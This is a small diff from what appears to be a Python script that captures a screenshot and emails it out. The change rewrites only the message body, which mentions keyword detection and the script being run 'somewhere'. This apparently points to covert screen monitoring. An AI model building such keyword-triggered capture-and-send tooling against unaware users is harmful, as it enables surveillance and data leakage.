@@ -31,7 +31,7 @@ msg['From'] = sender_email
 msg['To'] = reciever_email
 msg['Subject'] = subject
 
-email_body = 'The specific keyword was detected so here is the Screenshot!'
+email_body = 'This email was sent because someone ran the script somewhere and the script caught the Screenshot was send!'
 msg.attach(MIMEText(email_body, 'plain'))
 
 filename = 'SS-'+a+'.png'         #storing the file to be sent
